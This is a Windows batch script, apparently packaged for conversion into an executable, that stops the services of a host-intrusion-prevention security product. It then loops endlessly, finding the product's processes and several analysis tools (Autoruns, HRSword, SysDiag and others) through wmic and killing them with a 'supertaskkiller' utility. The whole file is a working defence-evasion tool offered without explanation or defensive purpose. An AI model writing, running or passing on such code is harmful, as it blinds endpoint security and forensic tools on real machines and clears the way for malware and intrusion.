::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH/eyMrzzZ2oloxf8+9h0DDwDdR9EgoBbb+bpw+7pXPnyaGeJfIH61bvfp8h2n9I1s4UCXs=
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF65
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCmDJH2B9VY4FD1dQgWOMHKeA7QI4NTT+uW1rUMaX+szdIrJlLGWJYA=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
net stop HipsDaemon
net stop HRWSCCtrl
:begin
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='HipsDaemon.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='wsctrlsvc.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='HipsMain.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='HipsTray.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='wsctrl.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='Autoruns.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='BugReport.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='CrashDump.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='FileShred.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='HipsLog.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='HRConfig.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='HRSword.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='HRUpdate.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='leakrepair.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='NetDiag.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='NetFlow.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='PopBlock.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='repairhelper-x64.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='RightClickMan.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='sysclean.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='SysDiag.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
for /f "TOKENS=1" %%a in ('wmic PROCESS where "Name='usysdiag.exe'" get ProcessID ^| findstr [0-9]') do supertaskkiller.exe -p %%a
goto begin